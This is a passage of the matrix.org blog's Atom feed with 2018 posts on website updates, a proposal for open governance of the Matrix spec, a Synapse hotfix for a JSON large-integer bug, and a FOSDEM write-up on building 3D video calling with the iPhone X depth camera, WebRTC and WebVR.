          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/09/05/recent-matrix-org-website-improvements/" type="text/html"/>
        <id>https://matrix.org/blog/2018/09/05/recent-matrix-org-website-improvements/</id>
        
        <content type="html">&lt;p&gt;Recently I&#x27;ve been working to improve some of the content on the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&quot;&gt;matrix.org&lt;&#x2F;a&gt; website.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly &lt;strong&gt;&lt;a href=&quot;&#x2F;docs&#x2F;guides&#x2F;faq&quot;&gt;the FAQ&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt; now has updated content and a more presentable menu.&lt;&#x2F;p&gt;
&lt;p&gt;We have a &lt;strong&gt;&lt;a href=&quot;&#x2F;docs&#x2F;guides&#x2F;&quot;&gt;Guides Index&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;, which includes a clarified guide list, plus links to off-site contributions from the community. It&#x27;s possible to click &amp;quot;recommend&amp;quot; on these items if you&#x27;ve had a good experience with them. If you have documentation or guides you&#x27;d like to see added to the list, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@benpa:matrix.org&quot;&gt;contact me on Matrix&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&quot;&gt;make a pull request on the site repo&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, as part of a programme to improve visibility on projects in the Matrix ecosystem, we are introducing the &amp;quot;&lt;strong&gt;&lt;a href=&quot;&#x2F;docs&#x2F;projects&#x2F;clients-matrix&quot;&gt;Matrix Clients Matrix&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&amp;quot;. This is a list of some of the most popular current Matrix clients in the ecosystem today, and should shed some light on current feature statuses! The list is not exhaustive, and if you would like to see your client project included, please &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@benpa:matrix.org&quot;&gt;contact me at the same address&lt;&#x2F;a&gt;, or come chat in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-clients:lain.haus&quot;&gt;the Matrix Client Developers community room&lt;&#x2F;a&gt;. Pretty green Features grid:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;09&#x2F;Screen-Shot-2018-09-05-at-16.11.06.png&quot;&gt;&lt;img class=&quot;alignnone size-large wp-image-3538&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;09&#x2F;Screen-Shot-2018-09-05-at-16.11.06-1024x657.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;657&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Towards open governance for Matrix.org</title>
        <published>2018-06-20T00:00:00+00:00</published>
        <updated>2018-06-20T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/06/20/towards-open-governance-for-matrix-org/" type="text/html"/>
        <id>https://matrix.org/blog/2018/06/20/towards-open-governance-for-matrix-org/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Since we created Matrix.org back in 2014, the majority of the Matrix core team has worked for the same company - originally subsidiaries of Amdocs, and then since August 2017 for New Vector; the startup we incorporated to rehire the core team and support Matrix after we parted ways from Amdocs.&lt;&#x2F;p&gt;
&lt;p&gt;Despite working for a for-profit company, our prime directive has &lt;b&gt;always&lt;&#x2F;b&gt; been the long term mission to successfully run Matrix as a non-profit initiative for the benefit of the whole internet: to create a ubiquitous secure open network which gives users control back over their communication and avoids them ever being locked into silos again.  And even though Matrix.org hasn&#x27;t been a formal non-profit foundation, we&#x27;ve treated it as such in all respects (e.g. gathering donations to support development on Matrix)&lt;&#x2F;p&gt;
&lt;p&gt;Running Matrix.org as a non-profit means prioritising to neutrally support all players in the whole ecosystem without ever giving unfair advantage to any individual participant (particularly New Vector) - where that ecosystem includes end-users, client devs, testers, spec devs, server admins, companies building products on Matrix, bridge devs, bot devs, widget devs, server devs, distro maintainers, moderators, even end-users who are using Matrix indirectly via bridges.&lt;&#x2F;p&gt;
&lt;p&gt;That being said, having the core team work for the same startup is still a somewhat unorthodox model for an open source project building an open standard, so we&#x27;d like to explain the main reasons for doing it up to this point:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To ensure that Matrix is fit for real-world usage and to force us to dogfood it. To ensure that it is a protocol that works well enough that you can build a commercial startup around it if you so wanted, and to motivate us to build Matrix as something more than an academic or nerdy exercise in protocol design - rather one which can be commercially viable.&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To help ensure the core team is aligned and pulling towards the same goal, especially during the process of actually designing and “giving birth” to the initial protocol and getting it to an ‘r0&#x27; release across all APIs.  We strongly believe that when a project is in the design phase you get faster and better design from a bunch of people who are collaborating together towards the same goal, rather than independent factions who might pursue their own agendas at the expense of the overall project.&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Because we believe the value of Matrix lies in the size of the ecosystem, and if Matrix realises its full potential (i.e. it grows as big as the web), it only makes it more useful and valuable for *everyone*. We realise that it might be a leap of faith to believe that we don&#x27;t have any incentive to sabotage Matrix by privileging specific players (after all, there are so many companies out there in it just for the cash), but the fact is that this is where we stand, and we&#x27;re doing our best to prove it. To spell it out: it is in New Vector&#x27;s interest (and also in the interests of other Matrix-focused companies) to grow Matrix to be as big, open, unfragmented and as neutral as possible.  Matrix should be big enough for a multitude of wildly successful companies and projects to benefit from it, and everyone wins - just like the web.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;b&gt;However&lt;&#x2F;b&gt;, this approach is not perfect and comes with some major problems:
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Without clear separation of responsibilities and incentives, we have to ask the community to take it on faith that our efforts are never intended to privilege New Vector ahead of the wider ecosystem. This leaves room for doubt, especially when our reasoning is unclear or our conclusions controversial.&lt;br &#x2F;&gt;A good example of a controversial decision is the lack of investment by the core team in the Server-Server API.  For the last ~2 years (since Mar 2016) we made the judgement call to prioritise user-facing features and experience.  The rationale was that to grow Matrix we need to provide a viable alternative to Slack&#x2F;Discord&#x2F;WhatsApp etc, and doing that means providing a Client-Server API which lets clients do just that, and server implementations capable of running at scale. This is why the CS API has had a stable release since Dec 2015 (currently at r0.3.0) and why we&#x27;ve put so much effort into server scaling&#x2F;perf... but the SS API itself still has bugs and has still not yet made it to a stable release.&lt;br &#x2F;&gt;This is obviously incredibly frustrating to server devs who tried to implement the SS API despite it being unstable and unreleased. In retrospect it might have been a mistake and we could probably have turned off signup on matrix.org and diverted the resources to the SS API work instead.  However, this is a case of making the judgement call to prioritising the overall ecosystem over one class of stakeholders (server devs) by focusing on providing users usable and featureful decentralised communication apps. Indeed we strongly believe that users are the main means to grow the ecosystem (others have failed without them): no one joins a network with no friends, however popular it is among devs.  Nonetheless, we are finally in a position to &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;06&#x2F;15&#x2F;this-week-in-matrix-2018-06-15&#x2F;&quot;&gt;hire spec maintainers and get to a stable S2S&lt;&#x2F;a&gt; as fast as we possibly can, and frankly feel relieved to be able to unblock this situation.&lt;br &#x2F;&gt;Another good example is the recent &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;06&#x2F;14&#x2F;security-update-synapse-0-31-2&#x2F;&quot;&gt;0.31.2 security update&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; of Synapse: this was a defensive patch to the protocol that we added to ensure that even if bugs occur when authing events over federation, it should be impossible for a random user to ever hijack a room again.  We specced this out as a formal proposal and are gathering feedback, but expedited implementation in Synapse to protect the overall ecosystem. However, it turns out that the change breaks a small number of highly custom rooms, and so we find ourselves accused of privileging NV.  The reality is that we made a judgement call to protect the vast majority of today&#x27;s ecosystem (and hope to provide a longer-term fix in the relatively near future which &#x2F;will&#x2F; be compatible with more custom room use cases).
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Another problem is some companies find it a turn-off to participate in Matrix unless they have a well-defined process for influencing the direction of the protocol.  Now, sometimes this could be seen as a feature rather than a bug; the last thing the ecosystem needs is a greedy corp trying to subvert the protocol to its own competitive advantage, and we don&#x27;t want to be locked in that kind of battle either.  However, there are also lots of well-meaning and constructive companies who want to participate too, and there&#x27;s an argument that they want a well-defined process for doing so.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;The other main problem is simply one of checks &amp; balances.  Even though NV may be a good guardian today, what if something changed in future? e.g. if NV got bought by Microsoft, or if someone on the team had some crisis and changed priorities?  Whilst one could always fork, such things are incredibly disruptive and fragmenting and it&#x27;d be good to engineer Matrix.org&#x27;s governance to be resilient to such eventualities as much as is possible.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
To address these problems, in March of this year we started work on a long term proposal to establish an open governance model for Matrix which ensures the neutrality of the protocol, lets the community contribute as widely as possible, and incorporates a dedicated neutral non-profit Matrix.org Foundation separate to New Vector.
&lt;p&gt;As work progressed on the proposal, it became clear that actually transitioning to a new governance model would seriously slow down the sprint towards a stable r0 release. We therefore decided to put completing the governance model on hold until after the r0 release (scheduled for the end of August).&lt;&#x2F;p&gt;
&lt;p&gt;With the end of r0 now in sight, completing work on the governance model is back on the agenda. We obviously want to ensure that the proposed governance model is going to work for everyone, so we&#x27;d like to introduce the first draft of &lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;1vASIt2v0UwKnUKHNEjA_P3SFCM0kcIUl1LQyM--ax04&#x2F;edit#&quot;&gt;Matrix Spec Change 1318: a proposal for open governance of the Matrix.org Spec&lt;&#x2F;a&gt;. This is quite an early draft; the idea is to gather feedback over the next few months and we&#x27;ll then incorporate the Foundation and deploy the new governance model to coincide with the long-awaited stable release of all APIs of the Matrix Spec (assuming the release doesn&#x27;t slip).&lt;&#x2F;p&gt;
&lt;p&gt;The main points in the proposal are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To adopt the new governance model once all APIs have had a stable r0 release.  For S2S API, this means fixing the remaining flaws in the federation protocol and closing the spec omissions such that compliant independent implementations can be written purely based on the spec.  For the AS and IS and Push API it means just closing spec omissions (if any) and doing a final review.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To define the mission of Matrix: to return control of communication to users by building a standards-based open secure decentralised communication network.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To define the mandate of the core team to act as a neutral custodian of the Matrix Spec, prioritising the long-term success and growth of the overall network over individual commercial concerns.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To define the guiding principles of the core team, e.g. collaboration rather than competition and contrarianism.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To restructure the core team to incorporate members of the community as well as the founding core team.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To propose succession logistics for the core team
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;To propose the role and governance structure of the Matrix.org Foundation legal entity.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Feedback would be much appreciated on the &lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;document&#x2F;d&#x2F;1vASIt2v0UwKnUKHNEjA_P3SFCM0kcIUl1LQyM--ax04&#x2F;edit#&quot;&gt;MSC1318 Google Doc&lt;&#x2F;a&gt; - or come talk about it on 
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-spec-process:matrix.org&quot;&gt;#matrix-spec-process:matrix.org&lt;&#x2F;a&gt; (which we might as well use for governance too).
&lt;p&gt;It&#x27;s exciting times as we finally move towards an initial stable release of Matrix across all APIs - we are firmly on the road to a 1.0, and improving our governance model is a massive part of that process.&lt;&#x2F;p&gt;
&lt;p&gt;thanks,&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the core team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Urgent Synapse 0.26.1 hotfix out</title>
        <published>2018-03-16T00:00:00+00:00</published>
        <updated>2018-03-16T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/03/16/urgent-synapse-0-26-1-hotfix-out/" type="text/html"/>
        <id>https://matrix.org/blog/2018/03/16/urgent-synapse-0-26-1-hotfix-out/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We just rushed out an urgent hotfix release for Synapse 0.26.1, addressing a nasty bug in the ujson library which causes it to misbehave badly in the presence of JSON containing very large &amp;gt;64-bit integers.  Anyone whose synapses are currently filling up with &amp;quot;Value too big!&amp;quot; errors will want to upgrade immediately from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.26.1&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.26.1&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Sorry for the inconvenience.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-26-1-2018-03-15&quot;&gt;Changes in synapse v0.26.1 (2018-03-15)&lt;&#x2F;h3&gt;
&lt;p&gt;Bug fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix bug where an invalid event caused server to stop functioning correctly, due to parsing and serializing bugs in ujson library.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>3D Video Calling with Matrix, WebRTC and WebVR at FOSDEM 2018!</title>
        <published>2018-02-05T00:00:00+00:00</published>
        <updated>2018-02-05T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/02/05/3d-video-calling-with-matrix-webrtc-and-webvr-at-fosdem-2018/" type="text/html"/>
        <id>https://matrix.org/blog/2018/02/05/3d-video-calling-with-matrix-webrtc-and-webvr-at-fosdem-2018/</id>
        
        <content type="html">&lt;p&gt;&lt;strong&gt;TL;DR: We built a proof-of-concept for &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2018&#x2F;schedule&#x2F;event&#x2F;matrix_webvr&#x2F;&quot;&gt;FOSDEM&lt;&#x2F;a&gt; of the world&#x27;s first(?) 3D video calling using Matrix and the iPhone X... and it looks like this!!&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;Screen-Shot-2018-02-04-at-16.18.09.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2990&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;Screen-Shot-2018-02-04-at-16.18.09-1024x672.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;672&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;3dvc.jpeg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2989&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;3dvc-1024x768.jpeg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;768&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Last year we spent a few weeks putting together a &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;04&#x2F;04&#x2F;opening-up-cyberspace-with-matrix-and-webvr&#x2F;&quot;&gt;proof of concept of using Matrix as an open, interoperable communication layer for VR&#x2F;AR&lt;&#x2F;a&gt; - showing how you can use it as an open signalling protocol to connect users within (and between) virtual worlds, with full-mesh E2E encrypted video conferencing in VR; WebRTC calls overlaid on 360 degree video, and other fun stuff. The reasons for building the demo were quite eclectic:&lt;&#x2F;p&gt;
&lt;ol&gt;
 	&lt;li&gt;Try to highlight that Matrix is about much more than just about instant messaging or team chat&lt;&#x2F;li&gt;
 	&lt;li&gt;Try to encourage the community to jump in and build out more interesting use cases&lt;&#x2F;li&gt;
 	&lt;li&gt;Learn where the state of the art in WebVR + WebGL is&lt;&#x2F;li&gt;
 	&lt;li&gt;Kick off the process of encouraging folks to think about storing world geometry and physics in Matrix&lt;&#x2F;li&gt;
 	&lt;li&gt;Have a fun visual demo we could show to excite potential investors in New Vector (which comically backfired when the investment community spontaneously decided that &lt;a href=&quot;https:&#x2F;&#x2F;techcrunch.com&#x2F;2017&#x2F;08&#x2F;26&#x2F;this-vr-cycle-is-dead&#x2F;&quot;&gt;VR is still too early&lt;&#x2F;a&gt;).&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
In the end it succeeded on some points (highlighting exotic uses of Matrix; learning all about WebVR) and failed on others (a surge in Matrix-for-VR) - although we did have a lot of fun showing it off at the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=y0-j4Q77KXM&quot;&gt;ETHLDN meetup&lt;&#x2F;a&gt; back in October. (Eagle eyed viewers may be amused to spot team &lt;a href=&quot;https:&#x2F;&#x2F;status.im&quot;&gt;Status&lt;&#x2F;a&gt; &amp; Matrix sitting together in the audience ;)
&lt;p&gt;However, we still believe that Matrix is the missing link for decentralised communication within VR&#x2F;AR, and we were lucky enough to get a &lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2018&#x2F;schedule&#x2F;event&#x2F;matrix_webvr&#x2F;&quot;&gt;talk about Matrix+WebRTC+WebVR&lt;&#x2F;a&gt; accepted to the Real-Time Communications Devroom at FOSDEM 2018! So, given a new chance to show the world how cool Matrix-powered comms could be in VR&#x2F;AR, myself and Dave Baker went on a (very) quick detour to update the demo a little...&lt;&#x2F;p&gt;
&lt;p&gt;One of the issues of the original demo is that the video calling bits were just putting plain old video planes into the scene - floating television screens of 2D video content, if you will. This is better than nothing, but it&#x27;s sort of missing the whole point of VR&#x2F;AR: surely you want to see who you&#x27;re talking to in 3D? Ideally they should have the same presence as if they were physically in your virtual space. This could also be a big step towards fixing one of the oldest problems of video calling: gaze correction. We&#x27;ve been obsessed about gaze correction since our early days (pre-Matrix) building mobile video calling stacks: gaze correction tries to fix the fact that the break in eye contact caused by staring at the screen (rather than the camera) has a terrible impact on the emotional connection of a video call. &lt;em&gt;But&lt;&#x2F;em&gt; if the person you are talking to is 3D, you can always rotate them in 3D space (or reposition yourself) to correct their line of sight - to re-align their gaze so they&#x27;re actually looking (in VR) at the thing they&#x27;re looking at in real life!&lt;&#x2F;p&gt;
&lt;p&gt;Back in early 2017 it would have been wildly ambitious to build an off-the-shelf 3D video calling app - but this changed overnight in late 2017 with the introduction of the iPhone X and its TrueDepth infrared-dot-projector based depth camera; effectively a mini-Kinect. Suddenly we have a mainstream high quality depth+video camera perfectly optimised for 3D video calling, with &lt;a href=&quot;https:&#x2F;&#x2F;developer.apple.com&#x2F;videos&#x2F;play&#x2F;wwdc2017&#x2F;507&#x2F;&quot;&gt;excellent API support&lt;&#x2F;a&gt; from Apple. So we decided to see if we could be first in the world (as far as we know) to do 3D video calling using the iPhone X, using Matrix to signal the WebRTC media and using our WebVR demo as the viewing environment!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Step 1:&lt;&#x2F;strong&gt; Hack on WebRTC to add support for the iPhone X depth camera as a capture device. This is pretty easy, at least if you&#x27;re just swapping WebRTC&#x27;s AVFoundationVideoCapturer to request the depth camera instead of the video camera: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;commit&#x2F;c3044670d87c305d8f8ee72751939e281bf5223f&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;commit&#x2F;c3044670d87c305d8f8ee72751939e281bf5223f&lt;&#x2F;a&gt; is the starting point.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Step 2&lt;&#x2F;strong&gt;: Build a custom Riot&#x2F;iOS with the right WebRTC SDK.  This is relatively easy thanks to Riot&#x2F;iOS using CocoaPods and Google shipping a pod for WebRTC these days - it was a matter of tweaking Google&#x27;s pod so it could be referred to directly as a local project by Riot&#x2F;iOS (and so that it provided debug symbols in the form CocoaPods expects). Brief notes are at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;blob&#x2F;matthew&#x2F;depth&#x2F;matrix&#x2F;build_instructions.txt&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;blob&#x2F;matthew&#x2F;depth&#x2F;matrix&#x2F;build_instructions.txt&lt;&#x2F;a&gt; - many thanks to Manu for helping on this :)&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Step 3:&lt;&#x2F;strong&gt; Decide how to encode the depth buffer. Now, the official WebRTC working group quite correctly insists that depth data should be treated as a first class citizen which is modelled and compressed in its own right. However, it looks like nobody has added first-class depth support to official WebRTC yet - and if we want to be able to easily display 3D calls on generic browsers capable of running WebVR+WebRTC+Matrix, we have no choice but do the ugly thing and encode the depth into a video signal which can be compressed with VP8&#x2F;VP8&#x2F;H.264 etc.&lt;&#x2F;p&gt;
&lt;p&gt;A quick search showed that some folks had already proposed a method for encoding depth data into a video signal, back in the days of the Kinect: &lt;a href=&quot;https:&#x2F;&#x2F;reality.cs.ucl.ac.uk&#x2F;projects&#x2F;depth-streaming&#x2F;depth-streaming.pdf&quot;&gt;https:&#x2F;&#x2F;reality.cs.ucl.ac.uk&#x2F;projects&#x2F;depth-streaming&#x2F;depth-streaming.pdf&lt;&#x2F;a&gt;. The paper outlines a fairly simple approach: you encode the 16-bit depth data into the three 8-bit colour channels; putting the coarse depth data into Blue, and then finer-grained depth data into Red and Green, encoding it as a periodic triangle wave:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;Screen-Shot-2018-02-04-at-00.43.53.png&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2992&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;Screen-Shot-2018-02-04-at-00.43.53-1024x484.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;484&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In practice this means that as an object gets closer towards you, it gets gradually more blue - and meanwhile it pulses through a sequence of red and green so you can refine the precise depth more easily. So we went and implemented this, building a 16-bit lookup-table to encode the half-precision floating point 16-bit depth measurements the camera yields into video: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;compare&#x2F;c3044670d87c305d8f8ee72751939e281bf5223f...0258a4ef14c11a0161f078c970c64574629761c2.&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;compare&#x2F;c3044670d87c305d8f8ee72751939e281bf5223f...0258a4ef14c11a0161f078c970c64574629761c2.&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Placing a video call through to another Matrix client then coughed up a video stream that looks like this:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;depth-encoded.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2982&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;depth-encoded-956x1024.jpg&quot; alt=&quot;&quot; width=&quot;956&quot; height=&quot;1024&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, closer things (my head) are bluer than further things (the wall), and everything&#x27;s covered with trippy red &amp;amp; green stripes to refine the fine detail.  For the record, the iPhone TrueDepth camera emits 640x480 depth frames at around 24Hz.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Step 4&lt;&#x2F;strong&gt;: extend matrix-vr-demo to view a dot cloud, displaced using a WebGL vertex shader based on the encoded depth info.  Dave kindly did the honours: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;commit&#x2F;b14cdda605d3807080049e84181b46706cec553e&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-vr-demo&#x2F;commit&#x2F;b14cdda605d3807080049e84181b46706cec553e&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately, it showed that the depth encoding really wasn&#x27;t working very well... you can just about make out my head, but there are dots flying around all over the place, and when you view it in profile the 3D effect was almost entirely missing.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;bad.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2983&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;bad-1024x744.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;744&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The main problems seem to be:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Whenever there&#x27;s a big jump in depth, the stripes get incredibly noisy and don&#x27;t compress at all well, generating completely corrupt data at edges of objects (e.g. the sides of my head)&lt;&#x2F;li&gt;
 	&lt;li&gt;The complexity of the pattern as a whole isn&#x27;t particularly compression-friendly&lt;&#x2F;li&gt;
 	&lt;li&gt;The contrast of the red&#x2F;green stripes tends to dominate, causing the arguably more important blue to get overpowered during compression.&lt;&#x2F;li&gt;
 	&lt;li&gt;Converting from 4:4:4 RGB to 4:2:0 YUV (NV12) as required by WebRTC and then back to RGB inevitably entangles the colours - meaning that the extreme contrast of the red&#x2F;green stripes is very visible on the blue channel after round-tripping due to sampling artefacts.&lt;&#x2F;li&gt;
 	&lt;li&gt;I probably made a mistake by bitwise casting the 16-bit half-precision floating point depth values directly onto the 16-bit unsigned int lookup index, rather than interpreting the float as a number and building a new index into the lookup table based on its numeric value.  As a result, depth values being encoded ended up having a much lower range than they should.&lt;&#x2F;li&gt;
 	&lt;li&gt;There are probably other bugs too.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Step 5: &lt;&#x2F;strong&gt;Give up on the fancy depth encoding (for now): &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;commit&#x2F;2f5d29352ce5d80727639991b1480f610cbdd54c&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;webrtc&#x2F;commit&#x2F;2f5d29352ce5d80727639991b1480f610cbdd54c&lt;&#x2F;a&gt;.  In practice, simply picking a range of the 16-bit half-precision floats to fit in the integer range [0,255] turns out to be good enough for a quick demo (i.e. 8-bit depth buffer, but over a small subset of the 16-bit depth space) - the dot cloud suddenly looked a lot more 3D and recognisable:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;fixed.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-2984&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;02&#x2F;fixed-1024x832.jpg&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;832&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Step 6&lt;&#x2F;strong&gt;: Clearly this needs colour as well as depth.  This means asking WebRTC to add VideoTracks for both video and depth to your call&#x27;s MediaStream.  Firstly, we added a simple &#x27;matrixDepth&#x27; constraint to WebRTC to tell a video source whether to capture depth or not.  (Yes, I know there&#x27;s a &lt;a href=&quot;https:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;mediacapture-depth&#x2F;&quot;&gt;specced way to do this&lt;&#x2F;a&gt;, but given nothing else here is on spec, we went for the simplest approach).  However, it turns out that only one WebRTC&#x27;s AVFoundationVideoCapturer can run at a time, because it manages its own AVCaptureSession and you can only have one of those at a time in a given app.  As a result, the two capturers (one per video track) collided, with the second session killing the first session.  As a quick fix, we modified RTCAVFoundationVideoSource to accept an existing AVCaptureSession (and AVCaptureDeviceInput) so that the application itself can handle the capture session and select the device, which can then be shared between multiple capturers: &lt;a 